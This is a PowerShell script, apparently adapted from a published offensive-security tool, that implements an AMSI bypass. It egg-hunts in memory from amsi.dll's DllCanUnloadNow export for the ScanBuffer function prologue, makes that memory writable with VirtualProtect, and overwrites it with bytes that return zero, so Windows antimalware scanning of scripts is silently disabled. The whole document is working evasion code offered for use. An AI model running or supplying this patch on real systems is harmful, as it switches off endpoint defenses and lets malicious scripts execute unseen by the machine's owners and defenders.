<#
.SYNOPSIS
Microsoft has developed AMSI (Antimalware Scan Interface) as a method to defend against common malware execution and protect the end user. 
By default EDRs consume AMSI events as part of interpreted script detection during runtime, its also the first protection against obfuscation.

.DESCRIPTION
Antimalware Scan Interface bypass through egg hunting of DllCanUnloadNow (Original Author: Paul Laîné (@am0nsec))
 
.EXAMPLE
Invoke-AmsiBypass1
 
Description
-----------
Executes ScanBuffer bypass through egg hunting for DllCanUnloadNow
#>

$Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Kernel32

Class Hunter {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }

        return $address
    }
}


function Invoke-AmsiBypass1 {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $false)]
        [String]$program= 'cmd.exe'
    )
    Begin {
		[IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")
		[IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")
		If ([IntPtr]::Size -eq 8) {
			[byte[]]$egg = [byte[]] (
				0x4C, 0x8B, 0xDC,       # mov     r11,rsp
				0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
				0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
				0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi
				0x57,                   # push    rdi
				0x41, 0x56,             # push    r14
				0x41, 0x57,             # push    r15
				0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
			)
		} Else {
			[byte[]]$egg = [byte[]] (
				0x8B, 0xFF,             # mov     edi,edi
				0x55,                   # push    ebp
				0x8B, 0xEC,             # mov     ebp,esp
				0x83, 0xEC, 0x18,       # sub     esp,18h
				0x53,                   # push    ebx
				0x56                    # push    esi
			)
		}
    }

    Process {
		if( -Not $dllCanUnloadNowAddress )
		{
			Add-Type -AssemblyName PresentationFramework;
			[System.Windows.MessageBox]::Show('DllCanUnloadNow GetProcAddress failed');	
			return "";
		}
		
		[IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg);
		if( -Not $targetedAddress )
		{
			Add-Type -AssemblyName PresentationFramework;
			[System.Windows.MessageBox]::Show('Egg Hunting failed');
			return "";			
		}
		$oldProtectionBuffer = 0;
		[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null;
		$patch = [byte[]] (0x31, 0xC0,0xC3);
		[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3);
		$a = 0
		[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null;

    }

}
